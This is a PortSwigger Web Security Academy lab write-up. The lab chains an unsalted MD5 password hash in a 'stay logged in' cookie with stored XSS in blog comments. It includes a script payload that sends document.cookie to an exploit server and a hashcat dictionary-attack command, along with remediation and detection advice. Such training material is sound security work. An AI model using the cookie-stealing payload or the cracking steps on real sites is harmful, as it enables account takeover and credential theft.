# Offline Password Cracking

| Field | Detail |
|---|---|
| Lab | Offline password cracking |
| Platform | PortSwigger Web Security Academy |
| Vulnerability | Password hash exposed in cookie, cracked offline (MD5) |
| CWE | CWE-916: Use of Password Hash With Insufficient Computational Effort |
| Severity | High |
| Date | 15 November 2026 |
| Author | Md Jahidur Rahman Jahid |

## Summary

The "stay logged in" feature stores the user's password hash in a
cookie: the cookie value is just the username and the MD5 hash of
the password, Base64-encoded. MD5 is a fast hash with no salt, so
once an attacker has the hash they can crack it on their own
computer with no limit on guesses. The blog's comment section also
has a stored XSS flaw, so the attacker can steal the victim's
cookie with a malicious comment and then crack the hash offline.

## Steps to Reproduce

1. Log in with your own credentials (`wiener:peter`) and tick
   "Stay logged in". Intercept the login response in Burp Suite
   and look at the `Set-Cookie` header:

```http
Set-Cookie: stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw
```

2. Decode the cookie. Send the value to Burp Decoder and Base64
   decode it:

```
wiener:51dc30ddc473d43a6011e9ebba6ca770
```

   The format is `username:md5(password)`. The hash
   `51dc30ddc473d43a6011e9ebba6ca770` is the MD5 of `peter` — which
   confirms the hash is a plain unsalted MD5 of the password. The
   cookie also has no `HttpOnly` flag, so JavaScript can read it.
   
3. Find the XSS flaw. The blog comment form takes a comment, name,
   email, and website. Post a test comment containing
   `<script>alert(1)</script>` — the alert runs, confirming stored
   XSS in the comment field.
  
4.  Steal the victim's cookie. Post a comment with a payload that
   sends the reader's cookies to your exploit server:

```html
<script>document.location='https://<exploit-server-id>.exploit-server.net/'+document.cookie</script>
```

   When carlos reads the blog post, his browser runs the script and
   his `stay-logged-in` cookie arrives in the exploit server's
   access log.
   
5. Decode carlos's cookie the same way to get his username and MD5
   hash. (Hash found: ___)
   
6. Crack the hash offline. MD5 is fast and unsalted, so a
   dictionary attack works — run it through hashcat or a lookup
   service:

```
hashcat -m 0 -a 0 <hash> rockyou.txt
```

   (Password found: ___)
   
7. Log in as `carlos` with the cracked password, open the "My
   account" page, and delete the account to solve the lab.

## Evidence

[Screenshot: the login response setting the stay-logged-in cookie
— to be added]

[Screenshot: Burp Decoder showing wiener:md5(peter) after Base64
decoding — to be added]

[Screenshot: the XSS comment payload and the alert proving stored
XSS — to be added]

[Screenshot: the exploit server access log with carlos's cookie —
to be added]

[Screenshot: the cracked password (hashcat or lookup result) — to
be added]

## Impact

An attacker who can steal this cookie can:

- Crack the password offline with unlimited guesses — no lockout,
  no rate limiting, no alerts, because the cracking happens on the
  attacker's own computer.
- Log in as the victim with the real password, which looks like a
  normal login in every log.
- Take over any account whose owner reads the poisoned blog post,
  because the XSS delivers every reader's cookie to the attacker.

Two separate weaknesses combine into one account takeover: the
cookie hands out the hash, and the XSS hands out the cookie.

## Remediation

- Never store a password hash in a cookie. Use a long, random,
  server-side session token instead — one that means nothing if
  stolen on its own, and can be revoked.
- Hash passwords with a slow, salted algorithm (bcrypt, Argon2),
  never MD5 — so even a leaked hash resists offline cracking.
- Set the `HttpOnly` flag on all cookies, so JavaScript cannot
  read them.
- Fix the stored XSS: encode user input before showing it on the
  page, and validate the comment fields.

## Detection (SOC)

- Alert on comments containing `<script>` tags or `document.cookie`
  — the signature of a cookie-stealing payload.
- Alert on logins where the account's password was recently used
  from an unusual location after a long gap — the shape of a
  cracked-password login.
- Alert on requests to the blog that carry another user's session
  or stay-logged-in cookie from an unexpected IP.

## References

- PortSwigger — Offline password cracking: https://portswigger.net/web-security/authentication/other-mechanisms/lab-offline-password-cracking
- CWE-916: https://cwe.mitre.org/data/definitions/916.html
- CWE-79 (XSS): https://cwe.mitre.org/data/definitions/79.html
